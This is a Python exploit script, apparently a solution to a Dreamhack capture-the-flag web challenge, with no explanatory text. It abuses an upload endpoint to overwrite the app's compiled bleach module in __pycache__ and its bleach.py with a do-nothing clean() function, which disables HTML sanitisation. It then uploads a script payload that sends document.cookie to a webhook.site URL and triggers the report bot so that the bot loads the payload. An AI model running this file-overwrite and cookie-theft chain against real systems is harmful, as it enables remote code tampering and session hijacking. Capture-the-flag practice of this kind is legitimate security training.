import requests
import py_compile
import os

url = 'http://host8.dreamhack.games:18702/'
s = requests.Session()

def write(filename, contents):
    res = s.post(f'{url}/upload', files={
        'file': (
            filename,
            contents,
            'text/plain'
        )
    })

    assert 'successfully' in res.text.lower()
    print("> Wrote", filename)

# malicious bleach.py
payload_file = 'bleach.cpython-310.pyc'

with open('bleach.py', 'w') as f:
    payload = 'def clean(s): return s'

    f.write(payload)

py_compile.compile('bleach.py', cfile=payload_file)

# overwrite cached bleach.py
with open(payload_file, 'rb') as f:
    write(f'/app/__pycache__/{payload_file}', f.read())

write('/app/bleach.py', 'def clean(s): return s')

os.remove('bleach.py')
os.remove(payload_file)

# xss
xss_file = 'payload.html'

webhook = 'http://webhook.site/4fa620f9-d00d-4ed8-8dac-bcbbb78eadc8'
payload = "<script>location.href=`%s?e=${document.cookie}`</script>" % webhook

write(xss_file, payload)

res = s.post(f'{url}/report', data={
    'filename': xss_file
})

assert 'success' in res.text.lower()
print("> Reported payload")